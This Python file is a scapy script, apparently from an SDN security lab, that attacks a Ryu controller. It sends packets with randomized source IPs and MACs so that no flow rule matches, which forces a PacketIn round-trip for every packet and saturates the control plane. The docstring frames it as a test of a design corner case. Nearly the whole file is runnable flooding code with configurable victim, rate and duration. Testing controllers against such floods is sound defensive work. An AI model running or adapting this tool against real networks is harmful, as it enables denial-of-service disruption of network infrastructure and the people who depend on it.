"""
control_plane_saturation.py
==============================
SDN-SPECIFIC ATTACK: instead of attacking a host, this attacks the
Ryu CONTROLLER itself.

How it works: every packet that doesn't match an existing flow rule on
the switch triggers a PacketIn event sent to the controller. By sending
packets with RANDOMIZED source IPs/MACs (so no flow table entry ever
matches), every single packet forces a controller round-trip. At high
rate, this saturates the controller's processing and the switch-to-
controller channel - a control-plane DoS, distinct from any attack on
a normal host.

This directly tests corner case #5 from the design doc. Watch your
Ryu controller's CPU usage and PacketIn handling latency while this runs.

Run from the attacker host (needs scapy):
  sudo python3 control_plane_saturation.py --victim 10.0.0.1 --rate 500
"""

import argparse
import random
import time

from scapy.all import Ether, IP, UDP, sendp, RandMAC


def random_ip():
    return f"10.0.{random.randint(0,255)}.{random.randint(1,254)}"


def run_attack(victim_ip, iface, rate, duration):
    print(f"[*] Sending randomized-source packets via {iface} "
          f"at ~{rate} pkts/sec for {duration}s")
    print("[*] Each packet uses a NEW random src IP/MAC so no flow rule "
          "matches -> every packet forces a PacketIn to the controller.")

    end_time = time.time() + duration
    sent = 0
    interval = 1.0 / rate if rate > 0 else 0

    while time.time() < end_time:
        pkt = (
            Ether(src=RandMAC()) /
            IP(src=random_ip(), dst=victim_ip) /
            UDP(sport=random.randint(1024, 65535), dport=random.randint(1, 65535))
        )
        sendp(pkt, iface=iface, verbose=False)
        sent += 1
        if interval:
            time.sleep(interval)

    print(f"[*] Done. Sent {sent} packets with distinct source identities.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Control-plane saturation attack against Ryu controller"
    )
    parser.add_argument("--victim", required=True, help="Any reachable dst IP")
    parser.add_argument("--iface", default="eth0", help="Attacker host interface")
    parser.add_argument("--rate", type=int, default=200, help="Packets per second")
    parser.add_argument("--duration", type=int, default=30, help="Attack duration (s)")
    args = parser.parse_args()
    run_attack(args.victim, args.iface, args.rate, args.duration)
